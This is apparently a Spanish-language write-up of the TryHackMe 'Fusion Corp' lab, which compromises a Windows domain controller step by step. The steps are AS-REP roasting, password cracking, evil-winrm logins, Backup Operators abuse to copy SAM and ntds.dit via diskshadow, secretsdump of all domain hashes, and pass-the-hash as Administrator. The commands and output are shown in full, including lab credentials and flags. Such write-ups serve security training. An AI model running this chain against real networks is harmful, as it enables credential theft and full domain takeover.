---
tags:
title: Fusion Corp - Hard (THM)
permalink: /FusionCorp-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.64.130.59
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 00:39 -0400
Initiating Ping Scan at 00:39
Scanning 10.64.130.59 [4 ports]
Completed Ping Scan at 00:39, 0.30s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 00:39
Completed Parallel DNS resolution of 1 host. at 00:39, 0.50s elapsed
Initiating SYN Stealth Scan at 00:39
Scanning 10.64.130.59 [65535 ports]
Discovered open port 139/tcp on 10.64.130.59
Discovered open port 53/tcp on 10.64.130.59
Discovered open port 3389/tcp on 10.64.130.59
Discovered open port 80/tcp on 10.64.130.59
Discovered open port 445/tcp on 10.64.130.59
Discovered open port 135/tcp on 10.64.130.59
Discovered open port 49667/tcp on 10.64.130.59
Discovered open port 49670/tcp on 10.64.130.59
Discovered open port 389/tcp on 10.64.130.59
Discovered open port 49669/tcp on 10.64.130.59
Discovered open port 88/tcp on 10.64.130.59
Discovered open port 49671/tcp on 10.64.130.59
Discovered open port 636/tcp on 10.64.130.59
Discovered open port 3269/tcp on 10.64.130.59
Discovered open port 593/tcp on 10.64.130.59
Discovered open port 464/tcp on 10.64.130.59
Increasing send delay for 10.64.130.59 from 0 to 5 due to 15 out of 36 dropped probes since last increase.
Completed SYN Stealth Scan at 00:39, 29.92s elapsed (65535 total ports)
Nmap scan report for 10.64.130.59
Host is up, received echo-reply ttl 126 (0.46s latency).
Scanned at 2026-03-18 00:39:29 EDT for 29s
Not shown: 65519 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
80/tcp    open  http             syn-ack ttl 126
88/tcp    open  kerberos-sec     syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
389/tcp   open  ldap             syn-ack ttl 126
445/tcp   open  microsoft-ds     syn-ack ttl 126
464/tcp   open  kpasswd5         syn-ack ttl 126
593/tcp   open  http-rpc-epmap   syn-ack ttl 126
636/tcp   open  ldapssl          syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
49667/tcp open  unknown          syn-ack ttl 126
49669/tcp open  unknown          syn-ack ttl 126
49670/tcp open  unknown          syn-ack ttl 126
49671/tcp open  unknown          syn-ack ttl 126

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 30.89 seconds
           Raw packets sent: 262116 (11.533MB) | Rcvd: 1012 (233.657KB)
-e [*] IP: 10.64.130.59
[*] Puertos abiertos: 53,80,88,135,139,389,445,464,593,636,3269,3389,49667,49669,49670,49671
/usr/bin/xclip
-e [*] Service scanning with nmap against 53,80,88,135,139,389,445,464,593,636,3269,3389,49667,49669,49670,49671 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 00:39 -0400
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.38 seconds

..snip..

zs1n@ptw ~> nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3269,3389,49667,49669,49670,49671 10.64.130.59
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-18 00:47 -0400
Nmap scan report for fusion.corp (10.64.130.59)
Host is up (0.23s latency).

PORT      STATE    SERVICE    VERSION
53/tcp    open     domain     Simple DNS Plus
80/tcp    open     http       Microsoft IIS httpd 10.0
|_http-title: eBusiness Bootstrap Template
88/tcp    open     tcpwrapped
135/tcp   open     tcpwrapped
139/tcp   open     tcpwrapped
389/tcp   open     tcpwrapped
445/tcp   open     tcpwrapped
464/tcp   open     tcpwrapped
593/tcp   open     tcpwrapped
636/tcp   open     tcpwrapped
3269/tcp  open     tcpwrapped
3389/tcp  open     tcpwrapped
| ssl-cert: Subject: commonName=Fusion-DC.fusion.corp
| Not valid before: 2026-03-17T04:39:15
|_Not valid after:  2026-09-16T04:39:15
49667/tcp filtered unknown
49669/tcp open     tcpwrapped
49670/tcp open     tcpwrapped
49671/tcp open     tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-03-18T04:47:29
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.49 seconds

```
## Website

La pagina principal hostea una web de negocios

![[Pasted image 20260318014001.png]]

En el formulario de contacto de la misma no tiene ninguna funcionalidad.

![[Pasted image 20260318014159.png]]
### Feroxbuster enumeration

Enumerando archivos y directorios con `feroxbuster`, vi la ruta `/backup`.

```bash
zs1n@ptw ~> feroxbuster -u http://10.64.130.59/

..snip..
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        2l       10w      146c http://10.64.130.59/js => http://10.64.130.59/js/
301      GET        2l       10w      147c http://10.64.130.59/css => http://10.64.130.59/css/
301      GET        2l       10w      147c http://10.64.130.59/img => http://10.64.130.59/img/
301      GET        2l       10w      147c http://10.64.130.59/lib => http://10.64.130.59/lib/
301      GET        2l       10w      150c http://10.64.130.59/backup => http://10.64.130.59/backup/
200      GET     1363l     3799w    53888c http://10.64.130.59/
301      GET        2l       10w      147c http://10.64.130.59/CSS => http://10.64.130.59/CSS/
301      GET        2l       10w      146c http://10.64.130.59/JS => http://10.64.130.59/JS/
301      GET        2l       10w      146c http://10.64.130.59/Js => http://10.64.130.59/Js/
301      GET        2l       10w      147c http://10.64.130.59/Css => http://10.64.130.59/Css/
301      GET        2l       10w      154c http://10.64.130.59/lib/jquery => http://10.64.130.59/lib/jquery/
301      GET        2l       10w      147c http://10.64.130.59/IMG => http://10.64.130.59/IMG/
301      GET        2l       10w      147c http://10.64.130.59/Img => http://10.64.130.59/Img/
301      GET        2l       10w      150c http://10.64.130.59/BACKUP => http://10.64.130.59/BACKUP/
301      GET        2l       10w      147c http://10.64.130.59/Lib => http://10.64.130.59/Lib/
301      GET        2l       10w      155c http://10.64.130.59/contactform => http://10.64.130.59/contactform/
301      GET        2l       10w      151c http://10.64.130.59/lib/wow => http://10.64.130.59/lib/wow/
301      GET        2l       10w      154c http://10.64.130.59/lib/jQuery => http://10.64.130.59/lib/jQuery/
301      GET        2l       10w      150c http://10.64.130.59/BackUp => http://10.64.130.59/BackUp/
[###>----------------] - 3m     52723/300172  17m     found:19      errors:1606
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_10_64_130_59_-1773809471.state ...
[###>----------------] - 3m     52724/300172  17m     found:19      errors:1606
[####>---------------] - 3m      7000/30000   34/s    http://10.64.130.59/
[####>---------------] - 3m      6813/30000   36/s    http://10.64.130.59/js/
[####################] - 8s     30000/30000   4000/s  http://10.64.130.59/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8s     30000/30000   3914/s  http://10.64.130.59/img/ => Directory listing (add --scan-dir-listings to scan)
[####>---------------] - 3m      6722/30000   35/s    http://10.64.130.59/lib/
[####>---------------] - 3m      6763/30000   36/s    http://10.64.130.59/backup/
..snip..
```
### Valid users

Yendo a esta ruta, se me descarga un archivo `.ods` el cual se puede descomprimir el contenido usando `unzip` y luego analizar los archivos que están dentro del mismo, viendo que en el archivo `content.xml` en varias ocasiones aparecen los nombres de usuarios junto con su nomenclatura.

```bash
zs1n@ptw ~> xmllint --format content.xml
..snip..
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>Jhon Mickel</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce1">
            <text:p>jmickel</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16382"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>Andrew Arnold</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce1">
            <text:p>aarnold</text:p>
          </table:table-cell>
          <table:table-cell table:number-columns-repeated="16382"/>
        </table:table-row>
        <table:table-row table:style-name="ro2">
          <table:table-cell office:value-type="string" table:style-name="ce3">
            <text:p>Lellien Linda</text:p>
          </table:table-cell>
          <table:table-cell office:value-type="string" table:style-name="ce1">
            <text:p>llinda</text:p>
..snip..
```

Coloque los mismos dentro de un archivo llamado users, para luego enumerar cuales son validos en el dominio con `kerbrute`.

```bash
zs1n@ptw ~> kerbrute userenum --dc 10.64.130.59 -d fusion.corp users

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 03/18/26 - Ronnie Flathers @ropnop

2026/03/18 00:57:11 >  Using KDC(s):
2026/03/18 00:57:11 >  	10.64.130.59:88

2026/03/18 00:57:19 >  [+] VALID USERNAME:	 lparker@fusion.corp
2026/03/18 00:57:19 >  Done! Tested 22 usernames (1 valid) in 7.925 seconds
```
## Shell as lparker
### AS-REP Roasting

Use el nombre de el único usuario valido del dominio para ver si es vulnerable a `AS-REP Roast attack`, usando el parámetro `-no-pass` para indicar que no tengo la contraseña del mismo.
De manera que así conseguí un hash.

```bash
zs1n@ptw ~> impacket-GetNPUsers fusion.corp/lparker -no-pass -dc-ip 10.64.130.59
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Getting TGT for lparker
$krb5asrep$23$lparker@FUSION.CORP:ad90360bd90655960580976f55e21c17$9cee972fd44ff36400f13564198d12d907b4f4c6baf150da36121a0b7e2809c03d46254a352e4b1d2351ca26fcd28d39477834369ac121e40206a4559f9ee7004507e0f8f5dd47202787cd5e586082b32eac7f5ef41ae002b6c430a7b7ae4ed12c20070c20d031d6d00bcc417815d949f55bee2a3d3b89637969084391a322864226cc5b7bfffd4be50d4816f20c0b888eb286f686ac11a987af525895a9354d656c10217d7b9499e8dd94ab50c169acbfca7b65aeb1ce562868a553563f3c8f2dbe630feb9a28075e9cb2c51961abc5ff05c26fd402b9504dbd5f256fc03ef1db3a627687e7f812066b
```
### Crack password

Use `john` para romper el hash, consiguiendo así la contraseña de este usuario.

```bash
zs1n@ptw ~> j hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!abbylvzsvs2k6! ($krb5asrep$23$lparker@FUSION.CORP)
1g 0:00:00:01 DONE (2026-03-18 00:59) 0.6578g/s 1619Kp/s 1619Kc/s 1619KC/s !@#$%&..หรพรืะฟๅ/-ภ
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Collect data

Use las credenciales del mismo para recolectar todos los datos para `bloodhound`.

```bash
zs1n@ptw ~> rusthound-ce -d fusion.corp -f fusion-dc.fusion.corp -i 10.64.130.59 -u lparker -p '!!abbylvzsvs2k6!' -z -c All
---------------------------------------------------
Initializing RustHound-CE at 01:04:19 on 03/18/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-03-18T05:04:19Z INFO  rusthound_ce] Verbosity level: Info
[2026-03-18T05:04:19Z INFO  rusthound_ce] Collection method: All
[2026-03-18T05:04:19Z INFO  rusthound_ce::ldap] Connected to FUSION.CORP Active Directory!
[2026-03-18T05:04:19Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-03-18T05:04:20Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-18T05:04:22Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=fusion,DC=corp
[2026-03-18T05:04:22Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-18T05:04:25Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Configuration,DC=fusion,DC=corp
[2026-03-18T05:04:25Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-18T05:04:27Z INFO  rusthound_ce::ldap] All data collected for NamingContext CN=Schema,CN=Configuration,DC=fusion,DC=corp
[2026-03-18T05:04:27Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-18T05:04:28Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=DomainDnsZones,DC=fusion,DC=corp
[2026-03-18T05:04:28Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)
[2026-03-18T05:04:28Z INFO  rusthound_ce::ldap] All data collected for NamingContext DC=ForestDnsZones,DC=fusion,DC=corp
[2026-03-18T05:04:28Z INFO  rusthound_ce::api] Starting the LDAP objects parsing...
[2026-03-18T05:04:28Z INFO  rusthound_ce::objects::domain] MachineAccountQuota: 10
[2026-03-18T05:04:28Z INFO  rusthound_ce::api] Parsing LDAP objects finished!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::checker] Starting checker to replace some values...
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::checker] Checking and replacing some values finished!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 6 users parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 60 groups parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 1 computers parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 1 ous parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 1 domains parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 2 gpos parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-03-18T05:04:28Z INFO  rusthound_ce::json::maker::common] .//20260318010428_fusion-corp_rusthound-ce.zip created!

RustHound-CE Enumeration Completed at 01:04:28 on 03/18/26! Happy Graphing!
```
### Shell 

Y además como el mismo era parte del grupo `Remote Management Users` me conecte por `WinRM`.

```powershell
zs1n@ptw ~> evil-winrm -i 10.64.130.59 -u lparker -p '!!abbylvzsvs2k6!'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\lparker\Documents>
*Evil-WinRM* PS C:\Users\lparker\desktop> type flag.txt
THM{c105b6fb249741b89432fada8218f4ef}
```
## Shell as jmurphy
### Password leakage

Con los datos de `bloodhound`, vi que el usuario `jmurphy` tenia un campo de descripción, con lo que parece ser la contraseña del mismo.

![[Pasted image 20260318024541.png]]
### Shell

Use las mismas nuevamente para conectarme por `WinRM`.

```powershell
zs1n@ptw ~> evil-winrm -i 10.64.163.117 -u jmurphy -p 'u8WC3!kLsgw=#bRY'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\jmurphy\Documents> type ../desktop/flag.txt
THM{b4aee2db2901514e28db4242e047612e}
```
## Shell as administrator
### Backup group

Como este usuario es parte del grupo `Backup operators` puedo guardar una copia de los registros `sam`, `system` y `security`.

```powershell

*Evil-WinRM* PS C:\Users\jmurphy\Documents> reg save HKLM\sam sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\jmurphy\Documents> reg save HKLM\system system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\jmurphy\Documents> download sam

Info: Downloading C:\Users\jmurphy\Documents\sam to sam

Info: Download successful!
*Evil-WinRM* PS C:\Users\jmurphy\Documents> download system
Info: Downloading C:\Users\jmurphy\Documents\system to system

Info: Download successful!
```
### Shell fail

Use `pypykatz` que es la versión de `mimikatz` pero de Linux, para dumpear los hashes dentro de estos registros, obteniendo así el hash del usuario administrator.

```bash
zs1n@ptw ~> pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: eafd8ccae4277851fc8684b967747318
============== SAM hive secrets ==============
HBoot Key: 6ecc70876cca61684c6f0289012489c810101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Lo valide con `nxc` para saber si era valido, pero no, ya que es el hash a nivel local de la maquina.

```bash
zs1n@ptw ~> nxc smb fusion.corp -u administrator -H '2182eed0101516d0a206b98c579565e6'
SMB         10.64.163.117   445    FUSION-DC        [*] Windows 10 / Server 2019 Build 17763 x64 (name:FUSION-DC) (domain:fusion.corp) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.64.163.117   445    FUSION-DC        [-] fusion.corp\administrator:2182eed0101516d0a206b98c579565e6 STATUS_LOGON_FAILURE
```
### ntds.dit

Por lo que ahora, necesito obtener una copia del registro `ntds` para poder obtener los hashes pero esta vez del dominio.
Para eso cree un archivo el cual con `diskshadow.exe` me voy a encargar de crear una nueva unidad lógica `z:\` para luego poder copiar dicho registro.

```bash
cat zsln.txt 
set context persistent nowriters 
add volume c: alias zs1n 
create 
expose %zs1n% z: 
```

Con `diskshadow` le paso el archivo que subí a la maquina:

PD: Cabe destacar que en el archivo, en cada linea del mismo, necesitamos colocar dos espacios al final de cada linea.

```powershell
*Evil-WinRM* PS C:\programdata> diskshadow /s zsln.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  FUSION-DC,  3/17/2026 11:04:55 PM

-> set context persistent nowriters
-> add volume c: alias zs1n
-> create
Alias zs1n for shadow ID {c6c1a8f6-0e97-447c-9a7b-c7b2b494a5c5} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {97730024-7544-4fbb-8008-fce070974fdb} set as environment variable.

Querying all shadow copies with the shadow copy set ID {97730024-7544-4fbb-8008-fce070974fdb}

	* Shadow copy ID = {c6c1a8f6-0e97-447c-9a7b-c7b2b494a5c5}		%zs1n%
		- Shadow copy set: {97730024-7544-4fbb-8008-fce070974fdb}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{66a659a9-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 3/17/2026 11:04:56 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
		- Originating machine: Fusion-DC.fusion.corp
		- Service machine: Fusion-DC.fusion.corp
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %zs1n% z:
-> %zs1n% = {c6c1a8f6-0e97-447c-9a7b-c7b2b494a5c5}
The shadow copy was successfully exposed as z:\.
->
```
### Copy registry file

Luego de crear la unidad `z:`, se puede comprobar el acceso a la misma usando

```powershell
dir z:\
```

Y ya después con `robocopy` puedo crear el archivo.

```powershell
*Evil-WinRM* PS C:\programdata> robocopy /b z:\Windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Tuesday, March 17, 2026 11:05:27 PM
   Source : z:\Windows\ntds\
     Dest : C:\programdata\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                   1	z:\Windows\ntds\
	    New File  		  16.0 m	ntds.dit
  0.0%
  0.3%
  0.7%
  1.1%
  1.5%
  1.9%
  2.3%
  2.7%
  3.1%
  3.5%
  3.9%
..snip..
```
### Dump domain hashes

Luego descargue el archivo a mi maquina, y con `secretsdump` volví a realizar el dumpeo del dominio, viendo que hay un hash distinto para el usuario Administrator.

```bash
zs1n@ptw ~> impacket-secretsdump -sam sam -system system -ntds ntds.dit LOCAL
Impacket v0.14.0.dev0+20260219.104542.8728bbcf - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xeafd8ccae4277851fc8684b967747318
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2182eed0101516d0a206b98c579565e6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 76cf6bbf02e743fac12666e5a41342a7
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9653b02d945329c7270525c4c2a69c67:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FUSION-DC$:1000:aad3b435b51404eeaad3b435b51404ee:06dad9b238c644fdc20c7633b82a72c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:feabe44b40ad2341cdef1fd95297ef38:::
fusion.corp\lparker:1103:aad3b435b51404eeaad3b435b51404ee:5a2ed7b4bb2cd206cc884319b97b6ce8:::
fusion.corp\jmurphy:1104:aad3b435b51404eeaad3b435b51404ee:69c62e471cf61441bb80c5af410a17a3:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:4db79e601e451bea7bb01d0a8a1b5d2950992b3d2e3e750ab1f3c93f2110a2e1
Administrator:aes128-cts-hmac-sha1-96:c0006e6cbd625c775cb9971c711d6ea8
Administrator:des-cbc-md5:d64f8c131997a42a
FUSION-DC$:aes256-cts-hmac-sha1-96:3512e0b58927d24c67b6d64f3d1b71e392b7d3465ae8e9a9bc21158e53a75088
FUSION-DC$:aes128-cts-hmac-sha1-96:70a93c812e563eb869ba00bcd892f76a
FUSION-DC$:des-cbc-md5:04b9ef07d9e0a279
krbtgt:aes256-cts-hmac-sha1-96:82e655601984d4d9d3fee50c9809c3a953a584a5949c6e82e5626340df2371ad
krbtgt:aes128-cts-hmac-sha1-96:63bf9a2734e81f83ed6ccb1a8982882c
krbtgt:des-cbc-md5:167a91b383cb104a
fusion.corp\lparker:aes256-cts-hmac-sha1-96:4c3daa8ed0c9f262289be9af7e35aeefe0f1e63458685c0130ef551b9a45e19a
fusion.corp\lparker:aes128-cts-hmac-sha1-96:4e918d7516a7fb9d17824f21a662a9dd
fusion.corp\lparker:des-cbc-md5:7c154cb3bf46d904
fusion.corp\jmurphy:aes256-cts-hmac-sha1-96:7f08daa9702156b2ad2438c272f73457f1dadfcb3837ab6a92d90b409d6f3150
fusion.corp\jmurphy:aes128-cts-hmac-sha1-96:c757288dab94bf7d0d26e88b7a16b3f0
fusion.corp\jmurphy:des-cbc-md5:5e64c22554988937
[*] Cleaning up...
```
### Shell 

Por lo que ahora si puedo conectarme con este.

```powershell
zs1n@ptw ~> evil-winrm -i fusion.corp -u administrator -H '9653b02d945329c7270525c4c2a69c67'

Evil-WinRM shell v3.9

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop; dir


    Directory: C:\Users\Administrator\desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         3/3/2021   6:05 AM             37 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type flag.txt
THM{f72988e57bfc1deeebf2115e10464d15}
```

`~Happy Hacking`